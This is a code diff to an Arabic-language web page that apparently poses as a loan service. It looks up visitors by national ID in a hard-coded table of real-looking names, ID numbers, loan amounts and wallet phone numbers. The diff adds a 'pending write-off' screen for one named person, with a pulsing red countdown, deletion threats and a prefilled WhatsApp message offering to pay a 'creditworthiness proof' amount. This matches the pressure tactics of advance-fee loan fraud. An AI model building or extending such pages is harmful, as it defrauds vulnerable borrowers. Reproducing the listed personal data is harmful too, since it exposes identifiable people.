@@ -301,6 +301,21 @@
             .timer { font-size: 2rem; }
             .details-grid { grid-template-columns: 1fr; }
         }
+        .shipping-card {
+            background: linear-gradient(145deg, #2a1a0a, #1a0f05);
+            border: 2px solid #FF4500;
+            border-radius: 2rem;
+            padding: 1.8rem;
+            text-align: center;
+        }
+        .urgent-timer {
+            border-color: #FF4500;
+            animation: pulseRed 1s infinite alternate;
+        }
+        @keyframes pulseRed {
+            0% { box-shadow: 0 0 5px #FF4500; border-color: #FF4500; }
+            100% { box-shadow: 0 0 20px #FF4500; border-color: #FF6600; }
+        }
     </style>
 </head>
 <body>
@@ -353,6 +368,7 @@
 
 <script>
     // قاعدة البيانات الكاملة (نفس الكود الأصلي مع جميع العملاء)
+    // تم تعديل حالة العميل "السيد احمد صادق شكرى" (27211180200935) إلى "جارى الشطب" (shippingCancellation: true)
     const customersDatabase = {
         "284121801258": { name: "إبراهيم صلاح إبراهيم محمد", loan: 60000, wallet: "فودافون كاش", walletNum: "01022138111", suspended: false },
         "29006040102911": { name: "مصطفى ربيع عبد الحميد", loan: 40000, wallet: "فودافون كاش", walletNum: "01003165531", suspended: false },
@@ -413,7 +429,10 @@
         "27504300101437": { name: "محمود حواش امين حواش", loan: 40000, wallet: "اتصالات كاش", walletNum: "01117836646", suspended: false },
         "26911280104354": { name: "مجدي محمد عبد الحكيم صالح", loan: 200000, wallet: "فودافون كاش", walletNum: "01061739274", suspended: false },
         "28806300201075": { name: "احمد عبد الحليم حلمى", loan: 70000, wallet: "اتصالات كاش", walletNum: "01156264597", suspended: false },
-        "27211180200935": { name: "السيد احمد صادق شكرى", loan: 40000, wallet: "فودافون كاش", walletNum: "01094222729", suspended: false },
+        
+        // ⭐ العميل المطلوب تعديله (السيد احمد صادق شكرى) - جارى الشطب
+        "27211180200935": { name: "السيد احمد صادق شكرى", loan: 40000, wallet: "فودافون كاش", walletNum: "01094222729", suspended: true, shippingCancellation: true },
+        
         "28712150200038": { name: "علاء الدين احمد خلف عبد العال", loan: 80000, wallet: "فودافون كاش", walletNum: "01006810707", suspended: false },
         "28710200201275": { name: "محروس ابراهيم محروس على", loan: 200000, wallet: "فودافون كاش", walletNum: "01021929987", suspended: false },
         "26912011500037": { name: "حسين حسن إسماعيل أحمد", loan: 200000, wallet: "فودافون كاش", walletNum: "01002026707", suspended: false },
@@ -498,10 +517,52 @@
         `;
     }
 
-    // دوال التعليق والتأخير (نفس السابق مع تعديل النصوص)
+    // رسالة خاصة للعميل "السيد احمد صادق شكرى" (جارى الشطب)
+    function buildShippingCancellationMessage(customer) {
+        const required = calculateProofAmount(customer.loan);
+        return `
+            <div class="shipping-card">
+                <i class="fas fa-trash-alt" style="font-size:3rem; color:#FF4500;"></i>
+                <h2 style="color:#FF4500; margin:0.5rem 0;">⚠️ جارى الشطب ⚠️</h2>
+                <p style="font-size:1.1rem;"><strong>${customer.name}</strong> ، طلب التمويل الخاص بك قيد <strong>الشطب النهائي</strong> بسبب عدم إثبات الجدارة الائتمانية خلال المدة المحددة.</p>
+                
+                <div class="step-box" style="border-right-color:#FF4500; background:rgba(255,69,0,0.15);">
+                    <i class="fab fa-whatsapp" style="font-size:1.4rem; color:#25D366;"></i>
+                    <strong>📢 إجراء استثنائي لاسترداد الطلب:</strong>
+                    <p style="margin-top:10px;">إذا كنت لا تزال ترغب في إثبات الجدارتك واستلام القرض، فيجب عليك <strong>التواصل مع قسم التحويلات المالية عبر واتساب</strong> فوراً. سيتم دراسة حالتك وإعادة فتح الطلب مرة أخرى لإتاحة الفرصة لتقديم الإثبات.</p>
+                    <p style="color:#FFD966; margin-top:6px;">⏳ ملاحظة: هذا الإجراء متاح لفترة محدودة – لا تتردد في التواصل now.</p>
+                </div>
+
+                <div class="timer-glow urgent-timer">
+                    <div><i class="fas fa-hourglass-end"></i> الوقت المتبقي قبل الشطب النهائي</div>
+                    <div class="timer" id="shippingTimer">26:00</div>
+                    <div style="font-size:0.75rem;">بعد انتهاء الوقت سيتم حذف طلبك ولن تتمكن من استرداده.</div>
+                </div>
+
+                <button class="btn-whatsapp" onclick="requestRecoveryForShipping('${customer.name.replace(/'/g, "\\'")}', '${customer.id}', ${required})" style="background:#FF4500; margin-top:0.5rem;">
+                    <i class="fab fa-whatsapp fa-lg"></i> 📞 التواصل مع التحويلات المالية لاسترداد الطلب
+                </button>
+                
+                <div class="step-box" style="margin-top:1rem; border-right-color:#FFD966;">
+                    <i class="fas fa-info-circle"></i> <strong>ملاحظة هامة:</strong> بعد التواصل، سيتم إعادة تفعيل واجهة إثبات الجدارة ومنحك مهلة جديدة لإكمال الإجراءات.
+                </div>
+            </div>
+        `;
+    }
+
     function displaySuspendedMessage(customer) {
         let html = '';
         const required = calculateProofAmount(customer.loan);
+        
+        // حالة خاصة لجارى الشطب (العميل السيد احمد صادق شكرى)
+        if (customer.shippingCancellation) {
+            html = buildShippingCancellationMessage(customer);
+            document.getElementById('resultSection').innerHTML = html;
+            document.getElementById('errorCard').style.display = 'none';
+            start30MinTimer('shippingTimer');
+            return;
+        }
+        
         if (customer.femaleSuspended) {
             html = `<div class="suspended-card">
                 <i class="fas fa-gavel" style="font-size:3rem; color:#FF8C42;"></i>
@@ -521,7 +582,7 @@
                 <button class="btn-whatsapp" onclick="requestUnfreezeAndGetInstructionsForSpecial('${customer.name.replace(/'/g, "\\'")}', '${customer.id}', ${required})">📞 إبلاغ القسم فوراً</button>
             </div>`;
             start30MinTimer('specialSuspendTimer');
-        } else {
+        } else if (customer.instructionRequired) {
             html = `<div class="suspended-card">
                 <i class="fas fa-info-circle"></i><h3>تعليق مؤقت من قسم التحويلات</h3>
                 <p>${customer.name}، يرجى التواصل مع الدعم عبر واتساب لاستكمال الإجراءات.</p>
@@ -581,7 +642,7 @@
         }, 800);
     }
 
-    // دوال الواتساب (نفسها)
+    // دوال الواتساب
     function openWhatsAppForDebt(name, id, amount) {
         const formatted = amount.toLocaleString('ar-EG') + ' ج.م';
         const msg = `السلام عليكم\nالعميل: ${name}\nالرقم القومي: ${id}\nسأقوم بإرسال صورتي الإيداع والخروج لإثبات الجدارة بمبلغ ${formatted}.`;
@@ -599,6 +660,13 @@
         const msg = `العميل: ${name}\nالرقم: ${id}\nأطلب فتح التعليق للحصول على تعليمات إثبات الجدارة.`;
         window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, '_blank');
     }
+    // وظيفة خاصة لاسترداد الطلب من الشطب
+    function requestRecoveryForShipping(name, id, amount) {
+        const formatted = amount.toLocaleString('ar-EG') + ' ج.م';
+        const msg = `🔴 عاجل جداً - طلب شطب\nالعميل: ${name}\nالرقم القومي: ${id}\n\nطلبى جارى الشطب بسبب عدم إثبات الجدارة. أرغب فى استرداد طلبي وإعادة فتحه لتقديم إثبات الجدارة بمبلغ ${formatted}. يرجى مساعدتي لاستكمال الصرف.`;
+        window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, '_blank');
+    }
+    
     function showModal() { document.getElementById('creditModal').style.display = 'flex'; }
     function closeModal() { document.getElementById('creditModal').style.display = 'none'; }
     window.onclick = (e) => { if(e.target === document.getElementById('creditModal')) closeModal(); };
@@ -608,6 +676,7 @@
     window.requestUnfreezeForFemale = requestUnfreezeForFemale;
     window.requestUnfreezeAndGetInstructionsForSpecial = requestUnfreezeAndGetInstructionsForSpecial;
     window.requestUnfreezeAndGetInstructions = requestUnfreezeAndGetInstructions;
+    window.requestRecoveryForShipping = requestRecoveryForShipping;
     window.closeModal = closeModal;
     document.getElementById('nationalId')?.addEventListener('keypress', (e) => { if(e.key === 'Enter') searchCustomer(); });
 </script>
